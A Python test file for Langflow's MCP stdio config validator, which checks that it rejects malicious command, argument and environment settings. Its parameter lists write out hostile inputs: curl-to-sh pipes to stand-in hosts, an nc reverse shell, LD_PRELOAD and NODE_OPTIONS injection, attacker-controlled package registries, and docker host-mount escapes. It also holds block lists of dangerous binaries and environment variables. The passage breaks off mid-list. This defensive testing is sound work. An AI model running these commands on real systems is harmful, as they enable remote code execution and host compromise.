"""Tests for MCP stdio config security validation.

These guard the flow-execution-time enforcement that mirrors the REST-layer MCPServerConfig
validators, closing the hole where a tenant-embedded MCP stdio config reached
``bash -c "exec <command>"`` without any allowlist/metacharacter checks.
"""

import re
from types import SimpleNamespace

import pytest
from lfx.base.mcp.security import (
    ALLOWED_MCP_COMMANDS,
    MCPStdioSecurityError,
    extract_base_command,
    validate_mcp_stdio_config,
)


@pytest.mark.parametrize(
    ("command", "args", "env"),
    [
        # The original exploit: bash -c '<payload>' (metacharacters + wrapped non-allowed cmd).
        ("bash", ["-c", "id > /tmp/pwned"], {}),
        ("sh", ["-c", "curl http://evil | sh"], {}),
        ("cmd", ["/c", "powershell -enc ..."], {}),
        # Command-packed bypass: whole payload in `command` with empty `args` (must be tokenized).
        ("bash -c 'curl http://evil|sh'", [], {}),
        ("sh -c id", [], {}),
        ("bash -c rm", [], {}),  # wrapper wrapping a non-allowed command
        ("python -c import os", [], {}),  # -c on a non-shell command
        ("uvx; curl http://evil", [], {}),  # smuggled command separator
        # Arbitrary non-allowlisted binary.
        ("curl", ["http://169.254.169.254/"], {}),
        ("/usr/bin/nc", ["-e", "/bin/sh"], {}),
        # -c with a non-shell command.
        ("python", ["-c", "import os"], {}),
        # Shell wrapper wrapping a non-allowed command.
        ("bash", ["-c", "rm"], {}),
        # Env-based code injection through an allowed command.
        ("uvx", ["mcp-server-fetch"], {"LD_PRELOAD": "/tmp/x.so"}),
        ("node", ["server.js"], {"NODE_OPTIONS": "--require /tmp/x.js"}),
        ("uvx", ["x"], {"BASH_FUNC_foo%%": "() { :; }; evil"}),
        # Package-runner source/config overrides can replace an approved package with attacker code.
        ("uvx", ["lfx"], {"UV_DEFAULT_INDEX": "https://attacker.invalid/simple"}),
        ("uvx", ["lfx"], {"uv_index": "evil=https://attacker.invalid/simple"}),
        ("uvx", ["lfx"], {"UV_FIND_LINKS": "https://attacker.invalid/packages"}),
        ("uvx", ["lfx"], {"UV_CONFIG_FILE": "/tenant/uv.toml"}),
        ("npx", ["lfx"], {"NPM_CONFIG_REGISTRY": "https://attacker.invalid"}),
        ("npx", ["lfx"], {"npm_config_userconfig": "/tenant/npmrc"}),
        # A tenant cannot supply the agentic user-id binding env var (case-insensitive); only
        # Langflow may inject it at spawn from the authenticated identity.
        ("python", ["-m", "langflow.agentic.mcp"], {"LANGFLOW_AGENTIC_USER_ID": "victim"}),
        ("uvx", ["x"], {"langflow_agentic_user_id": "victim"}),
        # Docker -- blocked even under the DEFAULT (lenient) policy.
        ("docker", ["run", "--privileged", "img"], {}),
        ("docker", ["run", "--cap-add", "SYS_ADMIN", "img"], {}),
        ("docker", ["run", "--network=host", "img"], {}),
        # SECURITY FIX: Combined dangerous keywords in a single argument (the reported vulnerability).
        # These must be rejected because they contain dangerous keywords when tokenized.
        ("python3", ["pip install requests"], {}),
        ("python", ["pip install malicious-package"], {}),
        ("node", ["npm install evil"], {}),
        ("python3", ["pip install --upgrade pip"], {}),
        ("bash", ["-c", "pip install requests"], {}),
        # -y/--yes flags on non-safe commands (should be blocked - not in COMMAND_SAFE_FLAGS)
        ("python", ["-y", "script.py"], {}),
        ("docker", ["run", "-y", "img"], {}),
        ("node", ["--yes", "script.js"], {}),
        ("bash", ["-y"], {}),
        ("sh", ["--yes", "script.sh"], {}),
    ],
)
def test_validate_mcp_stdio_config_blocks_malicious(command, args, env):
    with pytest.raises(MCPStdioSecurityError):
        validate_mcp_stdio_config(command, args, env)


# Docker host-access vectors that are ONLY rejected under the opt-in hardened policy
# (LANGFLOW_MCP_SERVER_DOCKER_HARDENING=true). Under the default they are allowed (previous
# single-tenant behavior), which test_docker_default_policy_is_lenient asserts.
@pytest.mark.parametrize(
    "args",
    [
        # Host filesystem / device mounts -> host compromise.
        ["run", "-v", "/:/host", "alpine"],
        ["run", "-v/:/host", "alpine"],
        ["run", "-itv", "/:/host", "alpine"],
        ["run", "--volume=/:/host", "alpine"],
        ["run", "-v", "/var/run/docker.sock:/s", "alpine"],
        ["run", "--mount", "type=bind,src=/,dst=/host", "alpine"],
        ["run", "--volumes-from", "other", "img"],
        ["run", "--device", "/dev/mem", "img"],
        ["run", "--device-cgroup-rule", "b 8:0 rwm", "img"],
        ["run", "--gpus", "all", "img"],
        ["run", "--use-api-socket", "img"],
        # Docker CLI host-file reads/writes.
        ["run", "--env-file", "/app/.env", "img"],
        ["run", "--label-file=/app/.env", "img"],
        ["run", "--cidfile", "/app/container.id", "img"],
        # Host / another-container namespaces.
        ["run", "--network", "host", "img"],
        ["run", "--net=host", "img"],
        ["run", "--pid", "host", "img"],
        ["run", "--ipc", "host", "img"],
        ["run", "--uts", "host", "img"],
        ["run", "--pid", "container:victim", "img"],
        ["run", "--cgroupns", "host", "img"],
        ["run", "--userns=host", "img"],
        # Non-default network (named infra network -> lateral movement).
        ["run", "--network", "internal-db-net", "img"],
        ["run", "--link", "database:db", "img"],
        # MCP stdio servers do not need host ports, custom runtimes, or restart persistence.
        ["run", "-p", "8080:80", "img"],
        ["run", "-p8080:80", "img"],
        ["run", "-itp8080:80", "img"],
        ["run", "-P", "img"],
        ["run", "--publish=8080:80", "img"],
        ["run", "--runtime", "custom", "img"],
        ["run", "--restart", "always", "img"],
        # Sandbox-profile downgrades.
        ["run", "--security-opt", "seccomp=unconfined", "img"],
        ["run", "--security-opt=apparmor=unconfined", "img"],
        ["run", "--security-opt", "label:disable", "img"],
        # Existing-container/build/daemon surfaces are outside the MCP Docker transport contract.
        ["exec", "victim", "node", "server.js"],
        ["cp", "victim:/etc/passwd", "./passwd"],
        ["build", "."],
        ["-H", "tcp://docker.internal:2375", "run", "img"],
    ],
)
def test_docker_hardened_policy_blocks_host_access(args):
    with pytest.raises(MCPStdioSecurityError):
        validate_mcp_stdio_config("docker", args, {}, docker_hardening=True)


@pytest.mark.parametrize(
    "args",
    [
        ["run", "-i", "--rm", "img"],
        ["run", "-i", "--rm", "img", "--server-arg", "x"],
        ["run", "--user", "1000", "img"],  # run as non-root (hardening)
        ["run", "--network", "none", "img"],
        ["run", "--network", "bridge", "img"],
        ["run", "--network=default", "img"],
        ["run", "--security-opt", "no-new-privileges", "img"],  # hardening flag, must stay allowed
        ["run", "--ipc", "private", "img"],
        ["run", "--cgroupns", "private", "img"],
    ],
)
def test_docker_hardened_policy_allows_benign(args):
    # Should not raise even under the strict policy.
    validate_mcp_stdio_config("docker", args, {}, docker_hardening=True)


@pytest.mark.parametrize(
    ("args", "should_block"),
    [
        # Default policy preserves previous behavior: these were always blocked...
        (["run", "--privileged", "img"], True),
        (["run", "--cap-add", "SYS_ADMIN", "img"], True),
        (["run", "--network=host", "img"], True),
        # Baseline source policy now blocks direct host access even when the
        # additional multi-tenant Docker hardening setting is disabled.
        (["run", "-v", "/:/host", "alpine"], True),
        (["run", "--mount", "type=bind,src=/,dst=/host", "alpine"], True),
        (["run", "--device", "/dev/mem", "img"], True),
        (["run", "--network", "host", "img"], True),
        (["run", "--security-opt", "seccomp=unconfined", "img"], True),
    ],
)
def test_docker_default_policy_blocks_baseline_host_access(args, should_block):
    if should_block:
        with pytest.raises(MCPStdioSecurityError):
            validate_mcp_stdio_config("docker", args, {}, docker_hardening=False)
    else:
        validate_mcp_stdio_config("docker", args, {}, docker_hardening=False)


@pytest.mark.parametrize(
    ("wrapped_command", "docker_hardening"),
    [
        ("docker run -v /:/host alpine", True),
        ("docker run --privileged alpine", False),
    ],
)
def test_shell_wrapped_docker_uses_selected_policy(wrapped_command, docker_hardening):
    with pytest.raises(MCPStdioSecurityError, match="Docker argument"):
        validate_mcp_stdio_config(
            "sh",
            ["-c", wrapped_command],
            {},
            docker_hardening=docker_hardening,
            interpreter_hardening=True,
        )


@pytest.mark.parametrize(
    ("command", "args", "env"),
    [
        ("uvx", ["mcp-server-fetch"], {}),
        ("npx", ["@modelcontextprotocol/server-filesystem", "/data"], {}),
        ("cmd", ["/c", "uvx", "mcp-server-fetch"], {}),
        ("sh", ["-c", "uvx mcp-server-time"], {}),
        ("python", ["-m", "my_server"], {}),
        ("docker", ["run", "-i", "--rm", "img"], {}),
        # Benign env var is fine.
        ("uvx", ["server"], {"MY_TOKEN": "abc"}),
        # SECURITY FIX: -y/--yes flags are now allowed for npx and uvx (the reported false positive).
        ("npx", ["-y", "@modelcontextprotocol/server-everything"], {}),
        ("uvx", ["-y", "mcp-server-fetch"], {}),
        ("npx", ["--yes", "@modelcontextprotocol/server-filesystem"], {}),
        ("uvx", ["--yes", "some-package"], {}),
        # Arguments that look like they might contain keywords but are actually safe
        ("python", ["-m", "server"], {}),
        ("node", ["server.js"], {}),
        ("uvx", ["package-name"], {}),
        ("npx", ["@scope/package"], {}),
    ],
)
def test_validate_mcp_stdio_config_allows_legitimate(command, args, env):
    # Should not raise.
    validate_mcp_stdio_config(command, args, env)


def test_extract_base_command_handles_paths_and_args():
    assert extract_base_command("/usr/local/bin/uvx") == "uvx"
    assert extract_base_command("uvx mcp-server-fetch") == "uvx"
    assert extract_base_command("node.exe") == "node"
    assert extract_base_command(r"C:\Program Files\nodejs\node.exe") == "node"


def test_allowlist_excludes_dangerous_binaries():
    for bad in ("curl", "wget", "nc", "rm", "perl", "ruby"):
        assert bad not in ALLOWED_MCP_COMMANDS


def test_empty_config_is_noop():
    # No command/args/env -> nothing to validate, must not raise.
    validate_mcp_stdio_config(None, None, None)
    validate_mcp_stdio_config("", [], {})


async def test_update_tools_blocks_malicious_stdio_before_connecting():
    """A flow-embedded malicious stdio config must be rejected before connecting.

    update_tools must raise at the security check before the stdio client attempts to
    connect (i.e. before the bash -c exec sink is reached).
    """
    from unittest.mock import AsyncMock

    from lfx.base.mcp.util import update_tools

    stdio_client = AsyncMock()
    stdio_client.connect_to_server = AsyncMock()

    malicious = {"mode": "Stdio", "command": "bash", "args": ["-c", "curl http://evil | sh"]}

    with pytest.raises(MCPStdioSecurityError):
        await update_tools("evil-server", malicious, mcp_stdio_client=stdio_client)

    assert stdio_client.connect_to_server.call_count == 0


async def test_update_tools_requires_user_for_agentic_server():
    """The internal agentic MCP server must fail closed without an authenticated user id.

    Otherwise a tenant could embed `python -m langflow.agentic.mcp` and read/write flows with
    an unscoped (or caller-chosen) user id.
    """
    from unittest.mock import AsyncMock

    from lfx.base.mcp.util import update_tools

    stdio_client = AsyncMock()
    stdio_client.connect_to_server = AsyncMock()
    config = {"mode": "Stdio", "command": "python", "args": ["-m", "langflow.agentic.mcp"]}
    with pytest.raises(ValueError, match="authenticated user"):
        await update_tools("langflow-agentic", config, mcp_stdio_client=stdio_client)
    assert stdio_client.connect_to_server.call_count == 0


def test_dangerous_keyword_tokenization():
    """Test that dangerous keywords are detected even when combined in a single argument.

    This is the core fix for the reported vulnerability where "pip install requests"
    as a single argument would bypass the keyword check.
    """
    # Single argument containing multiple dangerous keywords
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip install requests"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["npm install evil"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("node", ["yarn install package"], {})

    # Verify the old behavior (separate args) still works
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip", "install", "requests"], {})


def test_yes_flag_allowed_for_safe_commands():
    """Test that -y/--yes flags are allowed for npx and uvx but blocked for others.

    This fixes the false positive where legitimate npx -y usage was rejected.
    Uses the new COMMAND_SAFE_FLAGS structure for per-command flag allowlisting.
    """
    # Should be allowed for npx and uvx (defined in COMMAND_SAFE_FLAGS)
    validate_mcp_stdio_config("npx", ["-y", "@modelcontextprotocol/server-everything"], {})
    validate_mcp_stdio_config("uvx", ["-y", "mcp-server-fetch"], {})
    validate_mcp_stdio_config("npx", ["--yes", "@scope/package"], {})
    validate_mcp_stdio_config("uvx", ["--yes", "some-tool"], {})

    # Should be blocked for other commands (not in COMMAND_SAFE_FLAGS)
    # -y and --yes are in DANGEROUS_KEYWORDS, so they're rejected unless in COMMAND_SAFE_FLAGS
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["-y", "script.py"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("docker", ["run", "-y", "img"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("node", ["--yes", "script.js"], {})


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["--yes", "@attacker/owned-package"]),
        ("uvx", ["attacker-package"]),
        ("sh", ["-c", "uvx attacker-package"]),
        ("cmd", ["/c", "npx", "@attacker/owned-package"]),
        ("npx", ["--package", "@attacker/owned-package", "mcp-proxy"]),
        ("uvx", ["--with", "attacker-package", "mcp-proxy"]),
        ("uvx", ["--from", "lfx", "--with", "attacker-package", "lfx-mcp"]),
    ],
)
def test_package_runner_allowlist_rejects_unapproved_packages(command, args):
    with pytest.raises(MCPStdioSecurityError):
        validate_mcp_stdio_config(command, args, {}, allowed_packages={"mcp-proxy", "lfx"})


@pytest.mark.parametrize(
    ("command", "args", "rejection"),
    [
        (
            "npx",
            ["mcp-proxy@https://attacker.invalid/pkg.tgz"],
            "Argument 'mcp-proxy@https://attacker.invalid/pkg.tgz' is not allowed for MCP stdio command 'npx'",
        ),
        (
            "uvx",
            ["mcp-proxy @ https://attacker.invalid/pkg.whl"],
            "Argument 'mcp-proxy @ https://attacker.invalid/pkg.whl' is not allowed for MCP stdio command 'uvx'",
        ),
        (
            "uvx",
            ["--from", "lfx@file:///tmp/attacker", "lfx-mcp"],
            "Argument 'lfx@file:///tmp/attacker' is not allowed for MCP stdio command 'uvx'",
        ),
    ],
)
def test_package_runner_allowlist_rejects_direct_package_references(command, args, rejection):
    with pytest.raises(MCPStdioSecurityError, match=re.escape(rejection)):
        validate_mcp_stdio_config(command, args, {}, allowed_packages={"mcp-proxy", "lfx"})


@pytest.mark.parametrize(
    ("command", "args", "allowed"),
    [
        (
            "npx",
            ["--yes", "@modelcontextprotocol/server-everything@1.2.3"],
            {"@modelcontextprotocol/server-everything"},
        ),
        ("uvx", ["mcp-proxy==0.8.2", "--transport", "stdio"], {"mcp-proxy"}),
        ("uvx", ["--from", "lfx==1.11", "lfx-mcp"], {"lfx"}),
    ],
)
def test_package_runner_allowlist_preserves_approved_packages(command, args, allowed):
    validate_mcp_stdio_config(command, args, {}, allowed_packages=allowed)


@pytest.mark.parametrize("with_arg", ["-wmcp-proxy", "-w=mcp-proxy"])
def test_uvx_attached_with_preserves_approved_package_at_public_boundary(with_arg):
    validate_mcp_stdio_config("uvx", [with_arg, "mcp-proxy"], {}, allowed_packages={"mcp-proxy"})


def test_python_attached_code_flag_is_still_rejected():
    with pytest.raises(MCPStdioSecurityError, match="Flag -c or /c is only allowed with shell wrappers"):
        validate_mcp_stdio_config("python", ["-cpass"], {})


# ``cmd /c`` is not the only way cmd.exe runs a command line: ``/k`` runs it and keeps the
# session alive, ``/r`` is an undocumented synonym of ``/c``, and boolean switches may be
# clustered ahead of the executing switch (``/q/k``). Every spelling must bind the wrapped
# payload to the command allowlist exactly like ``/c`` does, otherwise the wrapper check is
# skipped and cmd.exe launches an arbitrary executable.
CMD_EXEC_SWITCHES = ["/c", "/C", "/k", "/K", "/r", "/R", "/q/k", "/s/k", "/d/k", "/Q/K"]


@pytest.mark.parametrize("switch", CMD_EXEC_SWITCHES)
def test_cmd_exec_switches_bind_wrapped_command_to_allowlist(switch):
    with pytest.raises(MCPStdioSecurityError, match="Shell wrapper 'cmd' cannot execute 'whoami'"):
        validate_mcp_stdio_config("cmd", [switch, "whoami"], {})


@pytest.mark.parametrize("switch", CMD_EXEC_SWITCHES)
def test_cmd_exec_switches_bind_wrapped_payload_to_package_allowlist(switch):
    with pytest.raises(MCPStdioSecurityError, match="not allowed for MCP npx"):
        validate_mcp_stdio_config(
            "cmd",
            [switch, "npx", "@attacker/owned-package"],
            {},
            allowed_packages={"mcp-proxy"},
        )


@pytest.mark.parametrize("switch", CMD_EXEC_SWITCHES)
def test_cmd_exec_switches_bind_wrapped_payload_to_interpreter_hardening(switch):
    with pytest.raises(MCPStdioSecurityError, match="INTERPRETER_HARDENING"):
        validate_mcp_stdio_config(
            "cmd",
            [switch, "node", "C:\\Users\\attacker\\server.js"],
            {},
            interpreter_hardening=True,
        )


@pytest.mark.parametrize(
    "args",
    [
        ["/c", "uvx", "mcp-server-fetch"],
        ["/k", "uvx", "mcp-server-fetch"],
        ["/q", "/c", "uvx", "mcp-server-fetch"],
        ["/d", "/k", "uvx", "mcp-server-fetch"],
        ["/e:on", "/c", "uvx", "mcp-server-fetch"],
        ["/t:0a", "/k", "uvx", "mcp-server-fetch"],
    ],
)
def test_cmd_wrapper_preserves_allowed_payload_behind_benign_switches(args):
    validate_mcp_stdio_config("cmd", args, {})


@pytest.mark.parametrize(
    "args",
    [
        ["--from", "lfx", "python", "/app/langflow/attacker/upload.py"],
        ["--from=lfx", "python3", "-m", "attacker_module"],
        ["--from", "lfx", "node", "/app/langflow/attacker/server.js"],
        ["--from", "lfx", "/tenant/lfx-mcp"],
    ],
)
def test_uvx_from_rejects_unapproved_entrypoint(args):
    with pytest.raises(MCPStdioSecurityError, match=r"Entrypoint '.+' is not allowed for MCP uvx package 'lfx'"):
        validate_mcp_stdio_config(
            "uvx",
            args,
            {},
            allowed_packages={"lfx"},
            interpreter_hardening=True,
        )


def test_uvx_from_requires_entrypoint():
    with pytest.raises(
        MCPStdioSecurityError,
        match=re.escape(
            "Entrypoint '<missing>' is not allowed for MCP uvx package 'lfx'. Allowed entrypoints: lfx-mcp"
        ),
    ):
        validate_mcp_stdio_config(
            "uvx",
            ["--from", "lfx"],
            {},
            allowed_packages={"lfx"},
            interpreter_hardening=True,
        )


def test_uvx_from_preserves_matching_package_entrypoint():
    validate_mcp_stdio_config(
        "uvx",
        ["--from", "mcp-proxy==0.8.2", "mcp-proxy", "https://example.invalid/mcp"],
        {},
        allowed_packages={"mcp-proxy"},
        interpreter_hardening=True,
    )


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("python", ["/app/langflow/attacker/upload.py"]),
        ("python3", ["-m", "attacker_module"]),
        ("node", ["/app/langflow/attacker/server.js"]),
        ("bash", ["/app/langflow/attacker/server.sh"]),
        ("cmd", ["C:\\Users\\attacker\\server.bat"]),
        ("sh", ["-c", "python /app/langflow/attacker/upload.py"]),
        ("cmd", ["/c", "node", "C:\\Users\\attacker\\server.js"]),
    ],
)
def test_interpreter_hardening_blocks_tenant_code(command, args):
    with pytest.raises(MCPStdioSecurityError, match="INTERPRETER_HARDENING"):
        validate_mcp_stdio_config(command, args, {}, interpreter_hardening=True)


@pytest.mark.parametrize("module", ["langflow.agentic.mcp", "langflow.agentic.mcp.server"])
def test_interpreter_hardening_preserves_bound_internal_server(module):
    validate_mcp_stdio_config("python", ["-m", module], {}, interpreter_hardening=True)


def test_interpreter_hardening_preserves_validated_shell_wrapper():
    validate_mcp_stdio_config(
        "sh",
        ["-c", "uvx mcp-proxy"],
        {},
        allowed_packages={"mcp-proxy"},
        interpreter_hardening=True,
    )


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("sh", ["/tenant/evil.sh", "-c", "uvx mcp-proxy"]),
        ("cmd", ["C:\\tenant\\evil.bat", "/c", "uvx", "mcp-proxy"]),
    ],
)
def test_interpreter_hardening_rejects_late_shell_exec_flag(command, args):
    with pytest.raises(MCPStdioSecurityError, match="INTERPRETER_HARDENING"):
        validate_mcp_stdio_config(
            command,
            args,
            {},
            allowed_packages={"mcp-proxy"},
            interpreter_hardening=True,
        )


def test_interpreter_default_preserves_legacy_single_tenant_config():
    validate_mcp_stdio_config("python", ["custom_server.py"], {}, interpreter_hardening=False)
    validate_mcp_stdio_config("node", ["custom_server.js"], {}, interpreter_hardening=False)


def test_configured_package_allowlist_is_enforced_at_validation_sink(monkeypatch):
    settings_service = SimpleNamespace(settings=SimpleNamespace(mcp_server_allowed_packages="mcp-proxy,lfx"))
    monkeypatch.setattr("lfx.services.deps.get_settings_service", lambda: settings_service)

    with pytest.raises(MCPStdioSecurityError, match="not allowed for MCP"):
        validate_mcp_stdio_config("npx", ["--yes", "@attacker/owned-package"], {})

    validate_mcp_stdio_config("uvx", ["mcp-proxy"], {})


def test_combined_keywords_with_quotes():
    """Test that shell-wrapped commands with dangerous keywords are detected."""
    # Shell wrappers with -c flag and dangerous keywords in the command string
    # These are caught by the shell wrapper validation (pip/npm are not allowed wrapped commands)
    with pytest.raises(MCPStdioSecurityError, match="cannot execute"):
        validate_mcp_stdio_config("bash", ["-c", "pip install evil"], {})

    with pytest.raises(MCPStdioSecurityError, match="cannot execute"):
        validate_mcp_stdio_config("sh", ["-c", "npm install malicious"], {})

    # But if we use an allowed wrapped command with dangerous keywords in args, those are caught
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("bash", ["-c", "python pip install evil"], {})


def test_edge_cases_for_tokenization():
    """Test edge cases in argument tokenization."""
    # Unbalanced quotes should still be checked (fallback to split)
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip install' requests"], {})

    # Multiple spaces between keywords
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["pip  install  requests"], {})

    # Tab-separated keywords
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["pip\tinstall\trequests"], {})


def test_combined_dangerous_keywords_bypass():
    """Combined dangerous keywords in single argument bypassed whole-string equality check.

    VULNERABILITY: POST /api/v2/mcp/servers/{name} with
    {"command":"python3","args":["pip install requests"]} returned 200 and registered
    the server because the check did `arg_lower in DANGEROUS_KEYWORDS` which compared
    the entire string "pip install requests" against individual keywords like "pip".

    FIX: Tokenize each argument with shlex.split() and check each token separately.

    IMPACT: Authenticated tenant could execute arbitrary package installation commands,
    leading to RCE via malicious packages or supply chain attacks.
    """
    # The exact payload from the vulnerability report - MUST be blocked
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip install requests"], {})

    # Verify the properly-split version is still blocked (original behavior preserved)
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip", "install", "requests"], {})

    # Other variations of the bypass exploit
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["pip install malicious-package"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip install --upgrade pip"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("node", ["npm install evil-package"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("node", ["yarn install malicious"], {})


def test_bypass_case_variation_combined_keywords():
    """Bypass attempt: Case variation in combined dangerous keywords.

    Attacker might try uppercase/mixed-case to bypass case-sensitive checks.
    """
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["PIP INSTALL requests"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["Pip Install malicious"], {})

    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("node", ["NPM INSTALL evil"], {})


def test_bypass_keyword_position_variation():
    """Bypass attempt: Dangerous keywords in non-standard positions.

    Attacker might place keywords at different positions hoping positional
    checks would miss them.
    """
    # Keywords at start and end
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip some-package install"], {})

    # Keywords separated by safe words
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["install via pip"], {})

    # Multiple dangerous keywords from different categories
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python", ["eval pip install"], {})


def test_bypass_punctuation_separated_keywords():
    """Bypass attempt: Dangerous keywords separated by punctuation instead of spaces.

    Attacker might use commas, semicolons, or other punctuation to separate
    keywords, hoping the tokenizer would fail. The enhanced tokenization now
    splits on these separators to detect the keywords.

    NOTE: Semicolons (;), pipes (|), and ampersands (&) are already in DANGEROUS_SHELL_CHARS,
    so they're caught by the metacharacter check before the keyword check. Commas are not
    shell metacharacters, so they reach the keyword tokenization logic.
    """
    # Keywords with commas - now detected by splitting on commas
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ["pip,install,requests"], {})

    # Keywords with semicolons - caught by shell metacharacter check first
    with pytest.raises(MCPStdioSecurityError, match="dangerous shell metacharacter"):
        validate_mcp_stdio_config("python", ["pip;install;requests"], {})

    # Keywords with parentheses - caught by shell metacharacter check first
    with pytest.raises(MCPStdioSecurityError, match="dangerous shell metacharacter"):
        validate_mcp_stdio_config("python", ["(pip install)"], {})

    # Keywords with pipes - caught by shell metacharacter check first
    with pytest.raises(MCPStdioSecurityError, match="dangerous shell metacharacter"):
        validate_mcp_stdio_config("python", ["pip|install|requests"], {})

    # Keywords with ampersands - caught by shell metacharacter check first
    with pytest.raises(MCPStdioSecurityError, match="dangerous shell metacharacter"):
        validate_mcp_stdio_config("python", ["pip&install&requests"], {})

    # Keywords with quotes (shlex handles these by removing quotes and splitting)
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", ['"pip" "install" "requests"'], {})


def test_bypass_nested_shell_with_combined_keywords():
    """Bypass attempt: Nested shell commands with combined dangerous keywords.

    Attacker might try to nest dangerous commands within shell wrappers.
    """
    # Shell wrapper with nested dangerous keywords
    # The shell wrapper validation catches "pip" as a non-allowed wrapped command
    with pytest.raises(MCPStdioSecurityError, match="cannot execute"):
        validate_mcp_stdio_config("bash", ["-c", "pip install requests"], {})

    # Allowed wrapped command with dangerous keywords in its args
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("bash", ["-c", "python pip install evil"], {})


def test_bypass_obfuscation_with_long_argument():
    """Bypass attempt: Hide dangerous keywords in very long arguments.

    Attacker might try to hide keywords in long strings hoping length-based
    truncation or performance shortcuts would skip validation.
    """
    long_arg = "some safe words " * 50 + "pip install requests" + " more safe words" * 50
    with pytest.raises(MCPStdioSecurityError, match="contains dangerous keyword"):
        validate_mcp_stdio_config("python3", [long_arg], {})


def test_safe_substring_keywords_allowed():
    """Verify that safe arguments containing keyword substrings are not blocked.

    "install" is a dangerous keyword, but "installer" or "installation" should be
    safe because they're different tokens after proper tokenization.
    """
    # These should NOT raise - they contain keyword substrings but not exact tokens
    validate_mcp_stdio_config("python", ["-m", "my_installer"], {})
    validate_mcp_stdio_config("node", ["installation-script.js"], {})
    validate_mcp_stdio_config("python", ["-m", "pipeline"], {})  # "pip" substring
    validate_mcp_stdio_config("python", ["--config=pipeline.yaml"], {})


def test_empty_and_whitespace_arguments_safe():
    """Verify that empty and whitespace-only arguments don't cause false positives."""
    validate_mcp_stdio_config("python", [""], {})
    validate_mcp_stdio_config("python", ["   "], {})
    validate_mcp_stdio_config("python", ["-m", "", "server"], {})


def test_command_safe_flags_extensibility():
    """Test that COMMAND_SAFE_FLAGS allows per-command flag customization.

    This verifies the new extensible structure where each command can have
    its own set of safe flags, making it easy to add new commands with
    specific flag requirements.
    """
    from lfx.base.mcp.security import COMMAND_SAFE_FLAGS

    # Verify the structure exists and has the expected commands
    assert "npx" in COMMAND_SAFE_FLAGS
    assert "uvx" in COMMAND_SAFE_FLAGS

    # Verify the flags are correctly defined
    assert "-y" in COMMAND_SAFE_FLAGS["npx"]
    assert "--yes" in COMMAND_SAFE_FLAGS["npx"]
    assert "-y" in COMMAND_SAFE_FLAGS["uvx"]
    assert "--yes" in COMMAND_SAFE_FLAGS["uvx"]

    # Verify commands not in the dict have no safe flags
    assert COMMAND_SAFE_FLAGS.get("python", frozenset()) == frozenset()
    assert COMMAND_SAFE_FLAGS.get("docker", frozenset()) == frozenset()


# ---------------------------------------------------------------------------
# Runtime-loader environment policy
#
# The first-generation env policy was a flat blocklist of exact names, so it only
# covered the loader/interpreter variables that had been enumerated at the time. Any
# code-loading variable that was not on the list -- most notably the OPENSSL_* family,
# whose OPENSSL_CONF points libcrypto at a config file that can dlopen an arbitrary
# shared object through its engine/provider sections -- passed validation and was
# forwarded verbatim into the spawned server's environment.
#
# The policy is now deny-by-default across whole runtime families, so an unenumerated
# member of an already-dangerous family is rejected without a code change.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "env_var",
    [
        # OpenSSL config/engine/provider loading -> dlopen of an attacker-supplied object.
        "OPENSSL_CONF",
        "OPENSSL_ENGINES",
        "OPENSSL_MODULES",
        # An unenumerated member of the same family must also be denied.
        "OPENSSL_SOMETHING_NEW",
        # CPython interpreter control beyond PYTHONPATH/PYTHONSTARTUP.
        "PYTHONHOME",
        "PYTHONBREAKPOINT",
        "PYTHONUSERBASE",
        "PYTHONEXECUTABLE",
        "PYTHONWARNINGS",
        # Node.js module/loader control beyond NODE_OPTIONS.
        "NODE_PATH",
        "NODE_REPL_EXTERNAL_MODULE",
        # git spawns these as helper commands.
        "GIT_SSH_COMMAND",
        "GIT_ASKPASS",
        "GIT_PROXY_COMMAND",
        "GIT_EXTERNAL_DIFF",
        "GIT_CONFIG_GLOBAL",
